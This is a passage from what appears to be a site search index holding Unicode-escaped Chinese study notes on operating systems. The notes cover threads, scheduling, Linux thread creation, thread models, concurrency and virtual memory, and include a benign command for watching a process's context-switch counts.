<li>\u662f\u7cfb\u7edf\u52a8\u6001\u6267\u884c\u57fa\u672c\u5355\u5143</li> <li>\u662f\u7cfb\u7edf\u8d44\u6e90\u5206\u914d\u5355\u4f4d</li> <li>\u662f\u7ebf\u7a0b\u7684\u5bb9\u5668</li> <li>\u662f\u6307\u4ee4\u3001\u6570\u636e\u53ca\u76f8\u5173\u8d44\u6e90\u7684\u96c6\u5408</li> <li>\u662f\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u7684\u62bd\u8c61</li> </ul>"},{"location":"sicp/software/#_8","title":"\u4ec0\u4e48\u662f\u7ebf\u7a0b","text":"<p>\u4e5f\u79f0\u200b\u8f7b\u91cf\u7ea7\u8fdb\u7a0b(LWP)\uff0c\u662f\u8fdb\u7a0b\u4e2d\u7684\u5b9e\u9645\u6267\u884c\u5355\u4f4d\uff0c\u4e00\u4e2a\u6807\u51c6\u7684\u7ebf\u7a0b\u7531\u7ebf\u7a0bID\u3001\u5f53\u524d\u6307\u4ee4\u6307\u9488(PC)\u3001\u5bc4\u5b58\u5668\u96c6\u5408\u548c\u5806\u6808\u7ec4\u6210\u3002\u4e00\u4e2a\u8fdb\u7a0b\u901a\u5e38\u62e5\u6709\u4e00\u4e2a\u6216\u591a\u4e2a\u7ebf\u7a0b\uff0c\u8fd9\u4e9b\u7ebf\u7a0b\u4e4b\u95f4\u5171\u4eab\u7a0b\u5e8f\u7684\u5185\u5b58\u7a7a\u95f4(\u5305\u542b\u4ee3\u7801\u6bb5\u3001\u6570\u636e\u6bb5\u3001\u5806\u7b49)\u4ee5\u53ca\u4e00\u4e9b\u8fdb\u7a0b\u7ea7\u7684\u8d44\u6e90(\u4f8b\u5982\u6253\u5f00\u7684\u6587\u4ef6\u3001\u63a5\u6536\u7684\u4fe1\u53f7\u7b49)\u3002</p> <p></p> <p>\u7ebf\u7a0b\u662f\u8c03\u5ea6\u548c\u65f6\u95f4\u7247\u7684\u5206\u914d\u5355\u4f4d\uff0c\u66f4\u591a\u7ebf\u7a0b\u7406\u8bba\u4e0a\u4f1a\u83b7\u5f97\u66f4\u591a\u7684CPU\u8d44\u6e90\uff0c\u540c\u4e00\u7a0b\u5e8f\u7684\u591a\u4e2a\u7ebf\u7a0b\u662f\u53ef\u4ee5\u5728\u591a\u6838\u5904\u7406\u5668\u4e0a\u5e76\u884c\u6267\u884c\u6765\u63d0\u9ad8\u6267\u884c\u541e\u5410\u7387\u7684\uff0c\u5f53\u7136\u8fd9\u4e5f\u8981\u770b\u64cd\u4f5c\u7cfb\u7edf\u7684\u8c03\u5ea6\u7b56\u7565\u3002</p> <p>\u4ece\u4e00\u4e2a\u7ebf\u7a0b\u5207\u6362\u5230\u53e6\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u9700\u8981\u4fdd\u5b58\u5f53\u524d\u7ebf\u7a0b\u7684\u72b6\u6001\uff0c\u5e76\u4e14\u6062\u590d\u53e6\u4e00\u7ebf\u7a0b\u7684\u72b6\u6001\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u53eb\u200b\u4e0a\u4e0b\u6587\u5207\u6362(context switch)\u3002\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u90fd\u6709\u4e0a\u4e0b\u6587\u5207\u6362\u3002\u533a\u522b\u5728\u4e8e\u7ebf\u7a0b\u5207\u6362\u671f\u95f4\uff0c\u865a\u62df\u5185\u5b58\u72b6\u6001\uff08TLB\uff09\u4fdd\u6301\u4e0d\u53d8\u3002\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u53ef\u4ee5\u89c2\u5bdf\u5230\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u60c5\u51b5:</p> <pre><code>$ watch grep \"ctxt\" /proc/{pid}/status  # \u5b9a\u65f6\u8f93\u51fa\n\nvoluntary_ctxt_switches:  3508          # \u7a0b\u5e8f\u81ea\u613f(\u6bd4\u5982\u6709\u8f83\u591aIO\u7b49\u5f85\u64cd\u4f5c)\nnonvoluntary_ctxt_switches: 64          # \u7cfb\u7edf\u5f3a\u5236(\u65f6\u95f4\u7247\u7528\u5b8c)\n</code></pre>"},{"location":"sicp/software/#_9","title":"\u7ebf\u7a0b\u8c03\u5ea6","text":"<p>\u5728\u5355CPU\u7684\u8bbe\u5907\u4e0a\uff0c\u5e76\u884c\u662f\u6a21\u62df\u51fa\u6765\u7684\uff0c\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u8f6e\u6d41\u6267\u884c\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u6bcf\u6b21\u4ec5\u6267\u884c\u4e00\u5c0f\u6bb5\u65f6\u95f4\uff0c\u8fd9\u6837\u4e0d\u65ad\u5728\u5904\u7406\u5668\u4e0a\u5207\u6362\u4e0d\u540c\u7684\u7ebf\u7a0b\u53bb\u6267\u884c\u7684\u884c\u4e3a\u6211\u4eec\u79f0\u4e3a\u200b\u7ebf\u7a0b\u8c03\u5ea6\u200b(Thread Schedule)\u3002\u5728\u8c03\u5ea6\u4e2d\uff0c\u7ebf\u7a0b\u901a\u5e38\u81f3\u5c11\u6709\u4e09\u79cd\u72b6\u6001:</p> <ul> <li>ready: \u7ebf\u7a0b\u53ef\u4ee5\u7acb\u523b\u6267\u884c\uff0c\u4f46CPU\u5df2\u7ecf\u88ab\u5360\u7528</li> <li>running: \u5360\u7528CPU\u8d44\u6e90\uff0c\u6b63\u5728\u6267\u884c</li> <li>waiting: \u6b64\u65f6\u7ebf\u7a0b\u6b63\u5728\u7b49\u5f85\u67d0\u4e00\u4ef6\u4e8b\u60c5(\u901a\u5e38\u662fIO\u6216\u540c\u6b65)\u53d1\u751f\uff0c\u65e0\u6cd5\u6267\u884c</li> </ul> <p>\u5b83\u4eec\u5728\u5982\u4e0b\u60c5\u51b5\u4f1a\u53d1\u751f\u72b6\u6001\u53d8\u5316:</p> <p></p> <p>\u7ebf\u7a0b\u7684\u8c03\u5ea6\u968f\u7740\u64cd\u4f5c\u7cfb\u7edf\u7684\u53d1\u5c55\u5df2\u7ecf\u662f\u5404\u79cd\u590d\u6742\u7684\u65b9\u6848\u548c\u7b97\u6cd5\u7684\u7ed3\u5408\uff0c\u4f46\u4e3b\u6d41\u7684\u7b97\u6cd5\u90fd\u5e26\u6709\u200b\u4f18\u5148\u7ea7\u8c03\u5ea6\u200b(Priority Schedule)\u548c\u200b\u8f6e\u8f6c\u6cd5(Round Robin)\u7684\u75d5\u8ff9\u3002\u8f6e\u8f6c\u6cd5\u5c31\u662f\u8ba9\u5404\u4e2a\u7ebf\u7a0b\u8f6e\u6d41\u6267\u884c\u4e00\u5c0f\u6bb5\u65f6\u95f4\uff0c\u800c\u4f18\u5148\u7ea7\u8c03\u5ea6\u53c8\u51b3\u5b9a\u4e86\u7ebf\u7a0b\u6309\u7167\u4ec0\u4e48\u987a\u5e8f\u6765\u8f6e\u6d41\u6267\u884c\u3002\u6b64\u5916\uff0c\u6211\u4eec\u628a\u7ebf\u7a0b\u6267\u884c\u5b8c\u65f6\u95f4\u7247\uff0c\u800c\u88ab\u5f3a\u5236\u5265\u593a\u6267\u884c\u6743\u5229\u7684\u8fc7\u7a0b\u79f0\u4e3a\u200b\u62a2\u5360\uff0c\u975e\u62a2\u5360\u5f0f\u7684\u8c03\u5ea6\u6a21\u5f0f\u4e5f\u5df2\u8d8a\u6765\u8d8a\u5c11\u3002</p>"},{"location":"sicp/software/#linux","title":"Linux\u7684\u591a\u7ebf\u7a0b","text":"<p>Windows\u5bf9\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u7684\u5b9e\u73b0\u5982\u540c\u6559\u79d1\u4e66\u4e00\u822c\u6807\u51c6\uff0c\u4f46\u5bf9\u4e8eLinux\uff0c\u5b83\u7684\u5185\u6838\u4e2d\u5e76\u4e0d\u5b58\u5728\u771f\u6b63\u610f\u4e49\u7684\u7ebf\u7a0b\u6982\u5ff5\u3002Linux\u5c06\u6240\u6709\u6267\u884c\u7684\u5b9e\u4f53(\u65e0\u8bba\u7ebf\u7a0b\u8fd8\u662f\u8fdb\u7a0b)\u90fd\u79f0\u4e3a\u4efb\u52a1\uff0c\u6bcf\u4e2a\u4efb\u52a1\u7c7b\u4f3c\u4e8e\u4e00\u4e2a\u5355\u7ebf\u7a0b\u7684\u8fdb\u7a0b\uff0c\u5b83\u6709\u5185\u5b58\u7a7a\u95f4\u3001\u6267\u884c\u5b9e\u4f53\u3001\u6587\u4ef6\u8d44\u6e90\u7b49\u3002\u4f46\u4e0d\u540c\u7684\u4efb\u52a1\u4e4b\u95f4\u662f\u53ef\u4ee5\u5171\u4eab\u5185\u5b58\u7a7a\u95f4\u7684\uff0c\u4ece\u8fd9\u4e2a\u89d2\u5ea6\uff0c\u5171\u4eab\u4e86\u540c\u4e00\u4e2a\u5185\u5b58\u7a7a\u95f4\u7684\u591a\u4e2a\u4efb\u52a1\u6784\u6210\u4e86\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u8fd9\u4e9b\u4efb\u52a1\u4e5f\u5c31\u6210\u4e86\u8fd9\u4e2a\u8fdb\u7a0b\u91cc\u7684\u7ebf\u7a0b\u3002</p> <p>Linux\u63d0\u4f9b\u7684\u521b\u5efa\u65b0\u4efb\u52a1\u7684API\u5305\u62ecfork\u3001exec\u3001clone\u3002fork\u901a\u8fc7\u590d\u5236\u5f53\u524d\u8fdb\u7a0b\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684\u4efb\u52a1\uff0c\u4f46\u5e76\u4e0d\u590d\u5236\u539f\u4efb\u52a1\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u800c\u662f\u548c\u539f\u4efb\u52a1\u5171\u4eab\u4e00\u4e2a\u5199\u65f6\u590d\u5236\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u6240\u4ee5\u5b83\u4ea7\u751f\u65b0\u4efb\u52a1\u7684\u901f\u5ea6\u5f88\u5feb\uff0c\u4f46\u5b83\u53ea\u80fd\u4ea7\u751f\u672c\u4efb\u52a1\u7684\u955c\u50cf\uff0c\u8fd9\u65f6\u5c31\u8981\u901a\u8fc7exec\u914d\u5408\u5219\u53ef\u4ee5\u542f\u52a8\u4e00\u4e2a\u522b\u7684\u65b0\u7684\u4efb\u52a1\u3002\u5982\u679c\u8981\u4ea7\u751f\u7684\u4e0d\u662f\u4efb\u52a1\u800c\u662f\u65b0\u7ebf\u7a0b\uff0c\u5219\u53ef\u4ee5\u7528clone\uff0c\u5b83\u4ea7\u751f\u65b0\u7684\u4efb\u52a1\u5e76\u4ece\u6307\u5b9a\u7684\u4f4d\u7f6e\u5f00\u59cb\u6267\u884c\uff0c\u5171\u4eab\u5f53\u524d\u8fdb\u7a0b\u7684\u5185\u5b58\u7a7a\u95f4(\u53ef\u9009\u7684)\uff0c\u4ece\u5b9e\u9645\u6548\u679c\u4e0a\u6765\u8bf4\u5c31\u4ea7\u751f\u4e86\u4e00\u4e2a\u65b0\u7684\u7ebf\u7a0b\u3002</p>"},{"location":"sicp/software/#_10","title":"\u7ebf\u7a0b\u6a21\u578b","text":"<p>\u5185\u6838\u7ebf\u7a0b\u548c\u7528\u6237\u7ebf\u7a0b\u662f\u6709\u533a\u522b\u7684\uff0c\u6211\u4eec\u4e00\u822c\u4f7f\u7528\u7684\u7ebf\u7a0b\u90fd\u662f\u88ab\u5305\u88c5\u8fc7\u7684\uff0c\u5f88\u5c11\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u6765\u4f7f\u7528\u7ebf\u7a0b\uff0c\u7528\u6237\u7ebf\u7a0b\u5f80\u5f80\u662f\u5185\u6838\u7ebf\u7a0b\u7684\u5305\u88c5\u4f53\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u7528\u6237\u7ebf\u7a0b\u5bf9\u5e94\u4e00\u4e2a\u5185\u6838\u7ebf\u7a0b\uff0c\u6211\u4eec\u79f0\u4e3a\u200b\u4e00\u5bf9\u4e00\u6a21\u578b\u3002\u8fd9\u79cd\u6a21\u578b\u4e0b\u7ebf\u7a0b\u4e4b\u95f4\u7684\u5e76\u53d1\u662f\u771f\u6b63\u7684\u5e76\u53d1\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u963b\u585e\u65f6\u5176\u4ed6\u7ebf\u7a0b\u7684\u6267\u884c\u4e0d\u53d7\u5f71\u54cd\u3002\u4f46\u5b83\u7684\u7f3a\u70b9\u4e5f\u5f88\u660e\u663e\uff0c\u5f88\u591a\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u9650\u5236\u5185\u6838\u7ebf\u7a0b\u7684\u6570\u91cf\uff0c\u7528\u6237\u7ebf\u7a0b\u7684\u6570\u91cf\u4e5f\u5c31\u88ab\u9650\u5236\u4e86\uff0c\u800c\u4e14\u5185\u6838\u7ebf\u7a0b\u7684\u8c03\u5ea6\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u5f00\u9500\u5f88\u5927\uff0c\u5bfc\u81f4\u7528\u6237\u7ebf\u7a0b\u7684\u6267\u884c\u6548\u7387\u4e5f\u4e0d\u9ad8\u3002</p> <p>\u591a\u4e2a\u7528\u6237\u7ebf\u7a0b\u6620\u5c04\u5230\u4e00\u4e2a\u5185\u6838\u7ebf\u7a0b\u5373\u200b\u591a\u5bf9\u4e00\u6a21\u578b\u3002\u7ebf\u7a0b\u4e4b\u95f4\u7684\u5207\u6362\u7531\u7528\u6237\u6001\u7684\u4ee3\u7801\u6765\u8fdb\u884c\uff0c\u76f8\u5bf9\u4e8e\u4e00\u5bf9\u4e00\u7ebf\u7a0b\u5207\u6362\u4f1a\u5feb\u5f88\u591a\uff0c\u4f46\u5982\u679c\u4e00\u4e2a\u7528\u6237\u7ebf\u7a0b\u963b\u585e\uff0c\u5176\u4ed6\u7528\u6237\u7ebf\u7a0b\u4e5f\u65e0\u6cd5\u6267\u884c\uff0c\u56e0\u4e3a\u6b64\u65f6\u5185\u6838\u7ebf\u7a0b\u4e5f\u963b\u585e\u4e86\u3002</p> <p>\u8fd8\u6709\u4e00\u79cd\u662f\u200b\u591a\u5bf9\u591a\u6a21\u578b\uff0c\u7c7b\u4f3c\u4e8eGo\u7684\u673a\u5236\uff0c\u67d0\u4e2a\u65f6\u523b\u4e00\u4e2a\u7528\u6237\u7ebf\u7a0b\u5fc5\u7136\u5bf9\u5e94\u4e00\u4e2a\u7cfb\u7edf\u7ebf\u7a0b\uff0c\u4f46\u603b\u4f53\u6765\u770b\u7528\u6237\u7ebf\u7a0b\u53ef\u80fd\u6bd4\u7cfb\u7edf\u7ebf\u7a0b\u66f4\u591a\u6216\u8005\u66f4\u5c11\uff0c\u540c\u65f6\u7528\u6237\u7ebf\u7a0b\u7684\u6570\u91cf\u4e0d\u53d7\u9650\u5236\uff0c\u67d0\u7528\u6237\u7ebf\u7a0b\u7684\u963b\u585e\u4e5f\u4e0d\u4f1a\u8ba9\u6240\u6709\u7684\u7528\u6237\u7ebf\u7a0b\u90fd\u963b\u585e\u6389\u3002</p> <p>\u4e3a\u4ec0\u4e48\u8981\u5305\u88c5\u5185\u6838\u7ebf\u7a0b\u5462\uff1f\u5047\u5982\u6211\u4eec\u518d\u505a\u4e00\u4e2a\u6587\u4ef6\u8bfb\u64cd\u4f5c\uff0c\u5b83\u8981\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u6765\u5b8c\u6210\uff0c\u5b9e\u9645\u4f1a\u5206\u4e3a\u7528\u6237\u6001\u4ee3\u7801\u548c\u5185\u6838\u6001\u4ee3\u7801\uff0c\u8fd9\u5c31\u6d89\u53ca\u5230\u4e0a\u4e0b\u6587\u7684\u5207\u6362\uff0c\u5185\u6838\u7ebf\u7a0b\u7684\u8c03\u5ea6\u3001\u521b\u5efa\u7b49\uff0c\u5982\u679c\u8fd9\u79cd\u6587\u4ef6\u8bfb\u64cd\u4f5c\u5f88\u9891\u7e41\uff0c\u90a3\u4e48\u6210\u672c\u662f\u5f88\u9ad8\u7684\u3002\u6211\u4eec\u5c31\u4f1a\u8003\u8651\uff0c\u5728\u7528\u6237\u6001\u548c\u5185\u6838\u6001\u7684\u57fa\u7840\u4e0a\u80fd\u4e0d\u80fd\u5efa\u7acb\u7c7b\u4f3c\u4e8ePool\u7684\u6a21\u578b\u6765\u590d\u7528\u3002\u8fd9\u6837\u4e00\u6765\uff0c\u5185\u6838\u6001\u7684\u7cfb\u7edf\u7ebf\u7a0b\u8d1f\u8d23\u6267\u884c\uff0c\u7528\u6237\u6001\u7684\u7528\u6237\u7ebf\u7a0b\u8d1f\u8d23\u5b58\u50a8\u72b6\u6001\uff0c\u4ece\u800c\u907f\u514d\u4e86\u9891\u7e41\u521b\u5efa\u7cfb\u7edf\u7ebf\u7a0b\uff0c\u7528\u6237\u6001\u53ef\u4ee5\u521b\u5efa\u5f88\u591a\u7528\u6765\u5b58\u50a8\u72b6\u6001\u7684\u6267\u884c\u5355\u4f4d\uff0c\u6267\u884c\u65f6\u628a\u5b83\u7ed1\u5b9a\u5230\u4e00\u4e2a\u5185\u6838\u7ebf\u7a0b\u4e2d\u53bb\uff0c\u6267\u884c\u5b8c\u91ca\u653e\u5185\u6838\u7ebf\u7a0b\uff0c\u5185\u6838\u7ebf\u7a0b\u628a\u7ed1\u5b9a\u72b6\u6001\u5220\u9664\u540e\u653e\u5165\u6c60\u4e2d\uff0c\u4e0d\u9700\u8981\u6740\u6389\u5185\u6838\u7ebf\u7a0b\uff0c\u63a5\u4e0b\u6765\u53e6\u4e00\u4e2a\u6267\u884c\u5355\u4f4d\u91cd\u65b0\u7ed1\u5b9a\u5230\u8be5\u5185\u6838\u7ebf\u7a0b\u4e2d\u53bb\u6267\u884c\u3002</p> <p>\u6240\u4ee5\u5f53\u6211\u4eec\u9009\u62e9\u4e00\u95e8\u8bed\u8a00\u6216\u8005\u4e00\u79cd\u5e76\u53d1\u5e93\u7684\u65f6\u5019\uff0c\u662f\u8981\u77e5\u9053\u5b83\u7a76\u7adf\u7531\u5185\u6838\u7ebf\u7a0b\u5b9e\u73b0\u8fd8\u662f\u7528\u6237\u7ebf\u7a0b\u5b9e\u73b0\u7684\uff0c\u8fd9\u5728\u6027\u80fd\u4e0a\u662f\u6709\u5f88\u5927\u533a\u522b\u7684\u3002</p>"},{"location":"sicp/software/#_11","title":"\u5e76\u53d1\u4e0e\u5e76\u884c","text":""},{"location":"sicp/software/#_12","title":"\u57fa\u7840\u6982\u5ff5","text":"<p>\u5e76\u53d1\u4e0e\u5e76\u884c\u200b\u5173\u6ce8\u7684\u662f\u7a0b\u5e8f\u903b\u8f91\u7684\u6267\u884c\u3002\u5e76\u53d1\u662f\u4ece\u903b\u8f91\u89d2\u5ea6\u51fa\u53d1\u7684\uff0c\u6307\u7684\u662f\u591a\u4e2a\u4efb\u52a1\u80fd\u540c\u65f6\u6267\u884c\uff0c\u8fd9\u4e2a\u540c\u65f6\u662f\u76f8\u5bf9\u7684\u6982\u5ff5\uff0c\u6bd4\u5982\u5728\u4e00\u5c0f\u65f6\u5185\u5b8c\u6210\u3002\u800c\u5e76\u884c\u662f\u6307\u7269\u7406\u4e0a\u7684\u540c\u4e00\u65f6\u523b\u6267\u884c\u591a\u4e2a\u5e76\u53d1\u4efb\u52a1\uff0c\u8fd9\u5c31\u8981\u6c42\u591a\u673a\u5668\u6216\u591a\u6838\u3002\u6240\u4ee5\u8bf4\u5e76\u53d1\u662f\u5e76\u884c\u7684\u57fa\u7840\uff0c\u5e76\u884c\u662f\u5e76\u53d1\u7684\u7406\u60f3\u6267\u884c\u6a21\u5f0f\u3002</p> <p>\u540c\u6b65\u548c\u5f02\u6b65\u200b\u5173\u6ce8\u7684\u662f\u6d88\u606f\u901a\u4fe1\u673a\u5236\u3002\u540c\u6b65\u5c31\u662f\u5728\u8c03\u7528\u8005\u53d1\u51fa\u4e00\u4e2a\u8c03\u7528\u65f6\uff0c\u4e3b\u52a8\u7b49\u5f85\u8be5\u8c03\u7528\u7684\u7ed3\u679c\u3002\u800c\u5f02\u6b65\u5219\u662f\u53d1\u51fa\u8c03\u7528\u4e4b\u540e\u5c31\u4e0d\u7ba1\u4e86\uff0c\u8c03\u7528\u8005\u4e0d\u4f1a\u7acb\u5373\u5f97\u5230\u7ed3\u679c\uff0c\u7b49\u5f85\u88ab\u8c03\u7528\u65b9\u901a\u8fc7\u72b6\u6001\u3001\u901a\u77e5\u7b49\u544a\u8bc9\u8c03\u7528\u8005\uff0c\u6216\u662f\u901a\u8fc7\u56de\u8c03\u51fd\u6570\u5904\u7406\u8be5\u8c03\u7528\u3002</p> <p>\u963b\u585e\u548c\u975e\u963b\u585e\u200b\u5173\u6ce8\u7684\u662f\u7a0b\u5e8f\u5728\u7b49\u5f85\u8c03\u7528\u7ed3\u679c(\u6d88\u606f\u6216\u8fd4\u56de\u503c)\u65f6\u7684\u72b6\u6001\u3002\u963b\u585e\u8c03\u7528\u662f\u6307\u8c03\u7528\u7ed3\u679c\u8fd4\u56de\u4e4b\u524d\uff0c\u5f53\u524d\u7ebf\u7a0b\u88ab\u6302\u8d77\uff0c\u53ea\u6709\u5728\u5f97\u5230\u7ed3\u679c\u4e4b\u540e\u624d\u8fd4\u56de\u3002\u975e\u963b\u585e\u8c03\u7528\u662f\u6307\u5728\u4e0d\u80fd\u7acb\u523b\u5f97\u5230\u7ed3\u679c\u4e4b\u524d\uff0c\u8be5\u8c03\u7528\u5e76\u4e0d\u4f1a\u963b\u585e\u5f53\u524d\u7684\u7ebf\u7a0b\u3002</p>"},{"location":"sicp/software/#_13","title":"\u5e76\u53d1\u6a21\u578b","text":"<p>\u5b9e\u73b0\u5e76\u53d1\u901a\u5e38\u6709\u4e09\u79cd\u6a21\u578b\uff0c\u5373\u591a\u8fdb\u7a0b\u3001\u591a\u7ebf\u7a0b\u3001\u534f\u7a0b\u3002</p> <p>\u591a\u8fdb\u7a0b\u6a21\u578b\u628a\u7ebf\u7a0ba\u5c01\u88c5\u5230\u8fdb\u7a0b1\uff0c\u628a\u7ebf\u7a0bb\u5c01\u88c5\u5230\u8fdb\u7a0b2\uff0c\u7136\u540e\u7528\u591a\u4e2a\u8fdb\u7a0b\u6267\u884c\u3002\u5bf9\u4e8eCPU\u5bc6\u96c6\u578b\u573a\u666f\uff0c\u597d\u5904\u6709\u4e09\u70b9:</p> <ul> <li>\u5bf9\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u6765\u8bf4\uff0c\u8fd9\u4e2a\u8fdb\u7a0b\u7684\u4f18\u5148\u7ea7\u597d\u63a7\u5236\uff0c\u5206\u914d\u7684\u65f6\u95f4\u7247\u548c\u63a5\u6536\u4efb\u52a1\u7684\u65f6\u95f4\u7247\u662f\u5206\u79bb\u7684</li> <li>\u5bb9\u6613\u90e8\u7f72\u8fc1\u79fb\u81f3\u5176\u4ed6\u673a\u5668\u3002\u4e24\u4e2a\u8fdb\u7a0b\u76f8\u4e92\u901a\u4fe1\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u662fRPC\u6216Socket\u3001MQ\u3001\u6570\u636e\u5e93\u7b49</li> <li>\u6570\u91cf\u66f4\u6709\u5f39\u6027\u3002\u5728\u4e00\u4e2a\u8fdb\u7a0b\u91cc\u521b\u5efa\u591a\u4e2a\u7ebf\u7a0b\u5bf9\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u6765\u8bf4\u90fd\u662f\u88ab\u76d1\u7ba1\u7684\uff0c\u5e76\u6ca1\u6709\u591a\u4e2a\u8fdb\u7a0b\u5904\u7406\u8d77\u6765\u66f4\u6d41\u7545</li> </ul> <p>\u591a\u8fdb\u7a0b\u7684\u7f3a\u70b9\u5c31\u5728\u4e8e\u6570\u636e\u590d\u5236\u4ee5\u53ca\u521b\u5efa\u8fdb\u7a0b\u65f6\u7684\u5f00\u9500\u5927\u4e86\u3002</p> <p>\u6b63\u5e38\u60c5\u51b5\u4f18\u5148\u4f7f\u7528\u591a\u7ebf\u7a0b\u6a21\u578b\uff0c\u591a\u7ebf\u7a0b\u4f1a\u5c3d\u53ef\u80fd\u591a\u7684\u83b7\u53d6\u65f6\u95f4\u7247\uff0c\u64cd\u4f5c\u7cfb\u7edf\u6709\u64cd\u4f5c\u65f6\u95f4\u7247\u7684\u8c03\u5ea6\u5668\uff0c\u8be5\u8c03\u5ea6\u5668\u4f1a\u8ba1\u7b97\u6bcf\u4e2a\u7ebf\u7a0b\u7684\u65f6\u95f4\u7247\u4f7f\u7528\u5b8c\u4ee5\u540e\u4fdd\u5b58\u7ebf\u7a0b\u7684\u5bc4\u5b58\u5668\u7b49\u72b6\u6001\uff0c\u8fdb\u884c\u4e0a\u4e0b\u6587\u7684\u5207\u6362\u3002</p> <p>\u534f\u7a0b\u6a21\u578b\u662f\u7a0b\u5e8f\u901a\u8fc7\u81ea\u5df1\u5207\u6362\u7684\u65b9\u5f0f\u5b9e\u73b0\u5728\u5355\u4e2a\u7ebf\u7a0b\u5185\u3001\u5355\u4e2aCPU\u4e0a\u6267\u884c\u6765\u63d0\u9ad8CPU\u7684\u5229\u7528\u7387\uff0c\u5b83\u5145\u5206\u5229\u7528\u4e86IO\u7b49\u5f85\u65f6\u6d6a\u8d39\u7684\u65f6\u95f4\u7247\u3002</p>"},{"location":"sicp/software/#_14","title":"\u865a\u62df\u5b58\u50a8\u5668","text":""},{"location":"sicp/software/#_15","title":"\u57fa\u7840\u6982\u5ff5","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u6709\u4e00\u4e2a\u5f88\u5927\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u4e5f\u53eb\u200b\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002\u8fd9\u4e2a\u7a7a\u95f4\u7684\u524d\u9762\u4e00\u5927\u6bb5\u662f\u64cd\u4f5c\u7cfb\u7edf\u7528\u7684\uff0c\u4e4b\u540e\u7684\u6bcf\u4e2a\u8fdb\u7a0b\u4e5f\u90fd\u4f1a\u6709\u4e00\u4e2a\u72ec\u7acb\u7684\u5f88\u5927\u7684\u5730\u5740\u7a7a\u95f4\u3002\u8fd9\u6837\u4e0d\u540c\u7684\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u865a\u62df\u5730\u5740\uff0c\u5f53\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u8bbf\u95ee\u67d0\u4e2a\u5730\u5740\u5c31\u662f\u8bbf\u95ee\u8fdb\u7a0b\u5185\u7684\u865a\u62df\u5730\u5740\uff0c\u901a\u8fc7\u200b\u5185\u5b58\u7ba1\u7406\u5355\u5143\u200b\u200b(MMU\uff0c\u4e00\u822c\u96c6\u6210\u5728CPU\u5185\u90e8)\u7ffb\u8bd1\u6620\u5c04\u5230\u4e00\u4e2a\u7269\u7406\u5730\u5740\u3002\u8fd9\u6837\u7684\u597d\u5904\u5c31\u662f\u65e0\u8bba\u5728\u7a0b\u5e8f\u5185\u7684\u5730\u5740\u7a7a\u95f4\u600e\u4e48\u6298\u817e\u90fd\u4e0d\u4f1a\u5f71\u54cd\u5230\u5176\u4ed6\u7684\u7a0b\u5e8f\uff0c\u5bf9\u7f16\u8bd1\u5668\u4e5f\u66f4\u53cb\u597d\u66f4\u65b9\u4fbf\uff0c\u53ef\u4ee5\u63d0\u524d\u5206\u914d\u3002</p> <p>\u6211\u4eec\u5728\u7f16\u8bd1\u65f6\u770b\u5230\u7684\u90fd\u662f\u865a\u62df\u5730\u5740\uff0c\u7269\u7406\u5730\u5740\u5728\u8fd0\u884c\u671f\u624d\u80fd\u770b\u5230\u3002\u865a\u62df\u5730\u5740\u7a7a\u95f4\u672a\u5fc5\u4f1a\u5168\u90e8\u6620\u5c04\u5230\u4e3b\u5b58\u4e2d\uff0c\u4e5f\u4f1a\u7ed9\u5404\u4e2a\u8bbe\u5907\u4fdd\u7559\u4e00\u6bb5\u7a7a\u95f4\u3002</p> <p>\u865a\u62df\u5b58\u50a8\u5668\u200b\u53ef\u4ee5\u770b\u6210\u786c\u76d8\u4fdd\u5b58\u7684\u4e00\u4e2a\u5b57\u8282\u6570\u7ec4\uff0c\u865a\u62df\u5730\u5740\u7a7a\u95f4\u6709256TB\uff0c\u800c\u5b9e\u9645\u7684\u7269\u7406\u5185\u5b58\u53ef\u80fd\u53ea\u67098GB\uff0c\u6709\u8fd9\u4e48\u5927\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u5c31\u4e0d\u80fd\u963b\u6b62\u7a0b\u5e8f\u53bb\u4f7f\u7528\uff0c\u4e0d\u591f\u7684\u7269\u7406\u5b58\u50a8\u4f53\u6211\u4eec\u5c31\u901a\u8fc7\u786c\u76d8\u4e0a\u7684\u4ea4\u6362\u5206\u533a\u6765\u5f25\u8865\u3002\u4e5f\u6709\u53ef\u80fd\u7269\u7406\u5185\u5b58\u52a0\u4e0a\u4ea4\u6362\u5206\u533a\u90fd\u4e0d\u591f\u7a0b\u5e8f\u4f7f\u7528\uff0c\u5728Linux\u4e2d\u5c31\u4f1a\u5f15\u53d1OOM\u673a\u5236\u3002</p>"},{"location":"sicp/software/#_16","title":"\u5206\u6bb5\u4e0e\u5206\u9875","text":"<p>\u6700\u5f00\u59cb\u7684\u65f6\u5019\uff0c\u538b\u6839\u6ca1\u6709\u865a\u62df\u5185\u5b58\uff0c\u4eba\u4eec\u5728\u7269\u7406\u5185\u5b58\u4e0a\u76f4\u63a5\u4e3a\u67d0\u7a0b\u5e8f\u5206\u914d\u5185\u5b58\uff0c\u8fd9\u6837\u5e26\u6765\u7684\u95ee\u9898\u6709:\u5730\u5740\u7a7a\u95f4\u4e0d\u9694\u79bb\uff0c\u6076\u610f\u7684\u7a0b\u5e8f\u53ef\u4ee5\u8f7b\u677e\u6539\u5199\u522b\u4eba\